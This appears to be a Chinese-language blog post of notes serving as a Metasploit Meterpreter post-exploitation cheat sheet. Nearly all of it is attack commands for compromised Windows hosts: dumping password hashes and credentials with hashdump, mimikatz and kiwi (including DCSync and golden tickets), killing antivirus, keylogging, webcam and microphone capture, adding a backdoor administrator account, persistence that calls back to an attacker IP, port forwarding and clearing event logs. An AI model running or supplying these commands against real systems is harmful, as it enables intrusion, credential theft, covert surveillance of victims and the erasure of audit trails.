---
title: MSF后渗透
date: 2025-02-16 07:29:38
updated: 2026-05-29 05:08:35
tags:
  - 内网
---
```shell
chcp 65001 #乱码
sysinfo #查看目标主机系统信息
run scraper #查看目标主机详细信息
run hashdump #导出密码的哈希
load kiwi #加载mimikatz
ps #查看目标主机进程信息
pwd #查看目标当前目录(windows)
getlwd #查看目标当前目录(Linux)
search -f *.jsp -d e:\ #搜索E盘中所有以.jsp为后缀的文件
download e:\test.txt  /root #将目标机的e:\test.txt文件下载到/root目录下
upload /root/test.txt d:\test #将/root/test.txt上传到目标机的 d:\test\ 目录下
getpid #查看当前Meterpreter Shell的进程PID
migrate 1384 #将当前Meterpreter Shell的进程迁移到PID为1384的进程上
idletime #查看主机运行时间
getuid #查看获取的当前权限
getsystem #提权,获得的当前用户是administrator才能成功
run killav #关闭杀毒软件
screenshot #截图
webcam_list #查看目标主机的摄像头
webcam_snap #拍照
webcam_stream #开视频
execute 参数 -f 可执行文件 #执行可执行程序
    -f：指定可执行文件
    -H：创建一个隐藏进程
    -a：传递给命令的参数
    -i：跟进程进行交互
    -m：从内存中执行
    -t：使用当前伪造的线程令牌运行进程
    -s：在给定会话中执行进程
run getgui -u hack -p 123 #创建hack用户，密码为123
run getgui -e #开启远程桌面
keyscan_start #开启键盘记录功能
keyscan_dump #显示捕捉到的键盘记录信息
keyscan_stop #停止键盘记录功能
uictl disable keyboard #禁止目标使用键盘
uictl enable keyboard #允许目标使用键盘
uictl disable mouse #禁止目标使用鼠标
uictl enable mouse #允许目标使用鼠标
load #使用扩展库
run #使用扩展库
run persistence -X -i 5 -p 8888 -r 192.168.10.27 #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀
portfwd add -l 3389 -r 192.168.11.13 -p 3389 #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址
clearev #清除所有日志
```

# Post后渗透模块

```shell
run post/windows/manage/migrate #自动进程迁移
run post/windows/gather/checkvm #查看目标主机是否运行在虚拟机上
run post/windows/manage/killav #关闭杀毒软件
run post/windows/manage/enable_rdp #开启远程桌面服务
run post/windows/manage/autoroute #查看路由信息
run post/windows/gather/enum_logged_on_users #列举当前登录的用户
run post/windows/gather/enum_applications #列举应用程序
run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码
run post/windows/gather/smart_hashdump #dump出所有用户的hash
```

# 获取用户密码

```shell
##抓取自动登录的密码
run windows/gather/credentials/windows_autologin ##导出密码哈希
##hashdump 模块可以从SAM数据库中导出本地用户账号，执行：
run hashdump或run windows/gather/smart_hashdump
该命令的使用需要系统权限

##亦或者上传mimikatz程序
先getsystem提权至系统权限，然后执行execute -i -f mimikatz.exe
进入mimikatz的交互界面
privilege::debug
sekurlsa::logonpasswords
```

# kiwi模块

```shell
# 加载kiwi模块
load kiwi
## 查看kiwi模块的使用
help kiwi
creds_all #列举所有凭据
creds_kerberos #列举所有kerberos凭据
creds_msv #列举所有msv凭据
creds_ssp #列举所有ssp凭据
creds_tspkg #列举所有tspkg凭据
creds_wdigest #列举所有wdigest凭据
dcsync #通过DCSync检索用户帐户信息
dcsync_ntlm #通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create #创建黄金票据
kerberos_ticket_list #列举kerberos票据
kerberos_ticket_purge #清除kerberos票据
kerberos_ticket_use #使用kerberos票据
kiwi_cmd #执行mimikatz的命令，后面接mimikatz.exe的命令
    kiwi_cmd sekurlsa::logonpasswords #注意 kb2871997 补丁。
lsa_dump_sam #dump出lsa的SAM
lsa_dump_secrets #dump出lsa的密文
password_change #修改密码
wifi_list #列出当前用户的wifi配置文件
wifi_list_shared #列出共享wifi配置文件/编码
```

# 创建新账号

```shell
#先查看目标主机有哪些用户
run post/windows/gather/enum_logged_on_users
#创建用户，并把他添加到 Administrators 组中
run getgui -u hack -p 123
##添加到Administrators组中失败，cmd中手动添加
net localgroup administrators hack /add
```

# 启用远程桌面

```shell
#命令检查远程用户的空闲时长
idletime
#启用远程桌面
run getgui -e
或者
run post/windows/manage/enable_rdp
```

# 进程迁移

```shell
ps # 查看目标设备中运行的进程
getpid # 查看我们当前的进程id
migrate <pid> #进程迁移,迁移后会自动关闭原来进程,没有关闭可使用kill命令关闭
kill <pid> #关闭进程
run post/windows/manage/migrate #自动迁移进程
```

# 键盘记录

通常需要跟目标进程进行绑定(进程迁移)

```shell
keyscan_start #开启键盘记录功能
keyscan_dump #显示捕捉到的键盘记录信息
keyscan_stop #停止键盘记录功能
```

# 生成持续性后门

## 服务启动(metsvc)

```shell
run persistence -X -i 5 -p 4446 -r 192.168.0.104 #反弹时间间隔是5s 会自动连接192.168.0.104的4446端口，缺点是容易被杀毒软件查杀，然后它就在目标机新建了这个文件：C:\Windows\TEMP\jRBGTRRznuL.vbs ，并把该服务加入了注册表中，只要开机就会启动
```

## 启动项启动(persistence)

生成一个后门工具，然后放到windows的启动目录中：

> C:\\Users\\$username$\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Programs\\Startup

每次开机就都能启动后门文件

# 导入并执行PowerShell脚本

如果powershell脚本是用于域内信息收集的，则获取到的权限用户需要是域用户

```shell
load powershell #加载powershell功能
powershell_import /root/PowerView.ps1 #导入powershell脚本，提前将该powershell脚本放到指定目录
powershell_execute Get-NetDomain #执行该脚本下的功能模块Get-domain，该模块用于获取域信息，一个脚本下通常有多个功能模块
powershell_execute Invoke-UserHunter #该功能模块用于定位域管理员登录的主机
powershell_execute Get-NetForest #该模块用于定位域信息
powershell_execute Get-NetLocalGroup #查看本地组
powershell_execute Get-NetLocalGroup #枚举本地（或远程）机器上的本地组
powershell_execute Get-NetLocalGroupMember #枚举本地（或远程）机器上特定本地组的成员
powershell_execute Get-NetShare #返回本地（或远程）机器上的打开共享
powershell_execute Get-NetLoggedon #返回登录本地（或远程）机器的用户
powershell_execute Get-NetSession #返回本地（或远程）机器的会话信息
```

# 其他

## 系统命令

```shell
clearev #清除事件日志
drop_token #放弃任何活动的模拟令牌
execute #执行命令
getenv #获取一个或多个环境变量值
getpid #获取当前进程标识符
getprivs #尝试启用当前进程可用的所有权限
getsid #获取服务器运行的用户的 SID
getuid #获取服务器运行的用户
kill #终止进程
ps #列出正在运行的进程
reboot #重启远程计算机
reg #修改远程注册表并与之交互
rev2self #在远程机器上调用 RevertToSelf()
shell #放入系统命令 shell
shutdown #关闭远程计算机
steal_token #尝试从目标进程窃取模拟令牌
suspend #暂停或恢复进程列表
sysinfo #获取有关远程系统的信息，例如 OS
```

## 网络命令

```shell
arp #显示主机 ARP 缓存
getproxy #显示当前代理配置
ifconfig #显示网络接口
ipconfig #显示网络接口
netstat #显示网络连接
portfwd #将本地端口转发到远程服务
route #查看和修改路由表
```

## 禁止目标主机使用键盘鼠标

```shell
uictl disable (enable) keyboard #禁止(允许)目标使用键盘
uictl disable (enable) mouse #禁止(允许)目标使用鼠标
```

## 用目标主机摄像头拍照

```shell
webcam_list #获取目标系统的摄像头列表
webcam_snap #从指定的摄像头，拍摄照片
webcam_stream #从指定的摄像头，开启视频
```

## 文件系统命令

```shell
cat #将文件内容读到屏幕上
cd #更改目录
dir #列出文件
download #下载文件或目录
edit #编辑文件
getlwd #打印本地工作目录
getwd #打印工作目录
lcd #更改本地工作目录
lpwd #打印本地工作目录
ls #列出文件
mkdir #制作目录
mv #将源移动到目标
pwd #打印工作目录
rm #删除指定文件
rmdir #删除目录
search #搜索文件
show_mount upload #上传文件或目录
```

## 用户界面命令

```shell
enumdesktops #列出所有可访问的桌面和工作站
getdesktop #获取当前的meterpreter桌面
idletime #返回远程用户空闲的秒数
keyscan_dump #转储键盘记录数据
keyscan_start #开始键盘记录
keyscan_stop #停止键盘记录
screenshot #抓取交互式桌面的截图
setdesktop #更改meterpreters当前桌面
uictl #控制一些用户界面组件
```

## 摄像头命令

```shell
record_mic #从默认麦克风录制音频
webcam_chat #开启视频
webcam_list #列出网络摄像头
webcam_snap #从指定的网络摄像头拍摄快照
webcam_stream #从指定的网络摄像头播放视频流
```